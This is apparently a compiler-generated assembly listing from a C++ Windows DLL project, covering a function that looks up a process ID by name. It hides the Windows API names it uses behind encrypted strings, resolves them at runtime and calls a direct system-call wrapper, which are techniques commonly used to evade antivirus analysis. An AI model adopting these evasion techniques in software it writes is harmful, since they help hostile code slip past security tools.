; 773  :     unsigned long cRef = static_cast<unsigned long>(

	mov	eax, -1
	lock xadd DWORD PTR [rbx+16], eax
	cmp	eax, 1

; 774  :         InterlockedDecrement(reinterpret_cast<long*>(&m_RefCount)));
; 775  :     if (cRef == 0) {

	jne	SHORT $LN51@PIDFromNam

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rbx]
	test	rcx, rcx
	je	SHORT $LN58@PIDFromNam

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], 0
$LN58@PIDFromNam:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN59@PIDFromNam

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], 0
$LN59@PIDFromNam:
	mov	edx, 24
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
$LN51@PIDFromNam:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 152  : 		if ( strcmp(name, _bstr_t(processEntry.szExeFile)) == 0 ) {

	test	edi, edi
	je	SHORT $LN152@PIDFromNam

; 154  : 			break;
; 155  : 		}
; 156  : 	} while ( _Process32NextW(processSnapshot, &processEntry) ); // iterate if the next process in the snapshot is valid

	lea	rdx, QWORD PTR processEntry$[rbp-256]
	mov	rcx, rsi
	call	r15
	test	eax, eax
	jne	$LL4@PIDFromNam
	jmp	SHORT $LN3@PIDFromNam
$LN152@PIDFromNam:

; 153  : 			processID = processEntry.th32ProcessID;

	mov	r14d, DWORD PTR processEntry$[rbp-248]
$LN3@PIDFromNam:

; 161  : }

	mov	rcx, rsi
	call	SysNtClose
$LN232@PIDFromNam:
	mov	eax, r14d
	mov	rcx, QWORD PTR __$ArrayPad$[rbp-256]
	xor	rcx, rsp
	call	__security_check_cookie
	lea	r11, QWORD PTR [rsp+848]
	mov	rbx, QWORD PTR [r11+48]
	mov	rsi, QWORD PTR [r11+56]
	mov	rdi, QWORD PTR [r11+64]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rbp
	ret	0
$LN105@PIDFromNam:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN214@PIDFromNam:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 694  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	npad	1
$LN151@PIDFromNam:

; 324  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	int	3
$LN231@PIDFromNam:
?PIDFromName@ProcessUtilities@@YAKPEBD@Z ENDP		; ProcessUtilities::PIDFromName
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 32
obfuscator$4 = 40
$T5 = 72
obfuscator$6 = 80
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
processEntry$ = 256
__$ArrayPad$ = 832
name$ = 896
?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA PROC ; `ProcessUtilities::PIDFromName'::`1'::dtor$6
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA ENDP ; `ProcessUtilities::PIDFromName'::`1'::dtor$6
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 32
obfuscator$4 = 40
$T5 = 72
obfuscator$6 = 80
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
processEntry$ = 256
__$ArrayPad$ = 832
name$ = 896
?dtor$7@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA PROC ; `ProcessUtilities::PIDFromName'::`1'::dtor$7
	mov	rcx, QWORD PTR $T2[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$7@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA ENDP ; `ProcessUtilities::PIDFromName'::`1'::dtor$7
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 32
obfuscator$4 = 40
$T5 = 72
obfuscator$6 = 80
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
processEntry$ = 256
__$ArrayPad$ = 832
name$ = 896
?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA PROC ; `ProcessUtilities::PIDFromName'::`1'::dtor$10
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA ENDP ; `ProcessUtilities::PIDFromName'::`1'::dtor$10
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 32
obfuscator$4 = 40
$T5 = 72
obfuscator$6 = 80
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
processEntry$ = 256
__$ArrayPad$ = 832
name$ = 896
?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA PROC ; `ProcessUtilities::PIDFromName'::`1'::dtor$11
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA ENDP ; `ProcessUtilities::PIDFromName'::`1'::dtor$11
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 32
obfuscator$4 = 40
$T5 = 72
obfuscator$6 = 80
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
processEntry$ = 256
__$ArrayPad$ = 832
name$ = 896
?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA PROC ; `ProcessUtilities::PIDFromName'::`1'::dtor$5
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 24
	mov	rcx, QWORD PTR $T5[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA ENDP ; `ProcessUtilities::PIDFromName'::`1'::dtor$5
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 32
obfuscator$4 = 40
$T5 = 72
obfuscator$6 = 80
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
processEntry$ = 256
__$ArrayPad$ = 832
name$ = 896
?dtor$4@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA PROC ; `ProcessUtilities::PIDFromName'::`1'::dtor$4
	lea	rcx, QWORD PTR $T3[rdx]
	jmp	??1_bstr_t@@QEAA@XZ			; _bstr_t::~_bstr_t
?dtor$4@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA ENDP ; `ProcessUtilities::PIDFromName'::`1'::dtor$4
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 80
??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ PROC ; `ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator(), COMDAT

; 128  : 	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));

	push	rbx
	sub	rsp, 64					; 00000040H
	movdqa	xmm0, XMMWORD PTR __xmm@434c2d63eef5f7881e2b387beaf8e9a4
	mov	DWORD PTR obfuscator$[rsp+16], -67308108 ; fbfcf5b4H
	mov	DWORD PTR obfuscator$[rsp+20], 84948348	; 0510357cH
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+25], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 128  : 	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));

	lea	rax, QWORD PTR [rbx+24]
	lea	rcx, QWORD PTR obfuscator$[rsp+24]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	BYTE PTR [rbx+24], 231			; 000000e7H
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	BYTE PTR [rbx+24], 231			; 000000e7H
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ ENDP ; `ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 80
?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 64
??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ PROC ; `ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator(), COMDAT

; 129  : 	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));

	push	rbx
	sub	rsp, 48					; 00000030H
	movdqa	xmm0, XMMWORD PTR __xmm@e528cb6c095e11a3d60ccc7a185825c1
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+16], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 129  : 	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));

	lea	rax, QWORD PTR [rbx+15]
	lea	rcx, QWORD PTR obfuscator$[rsp+15]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 48					; 00000030H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 48					; 00000030H
	pop	rbx
	ret	0
??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ ENDP ; `ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 64
?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ PROC ; `ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator(), COMDAT

; 130  : 	PPROCFN::_Process32NextW           _Process32NextW = GetFunctionAddress<PPROCFN::_Process32NextW>(kernel32, std::string(HIDE("Process32NextW")));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN28@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+12], 30355483		; 01cf301bH
	mov	DWORD PTR [rbx], -1829089843		; 92fa4dcdH
	mov	DWORD PTR [rbx+4], 347870218		; 14bc140aH
	mov	DWORD PTR [rbx+8], -1980730961		; 89f071afH
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 130  : 	PPROCFN::_Process32NextW           _Process32NextW = GetFunctionAddress<PPROCFN::_Process32NextW>(kernel32, std::string(HIDE("Process32NextW")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN28@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ ENDP ; `ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	WORD PTR [rdx+12], ax
	mov	BYTE PTR [rdx+14], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
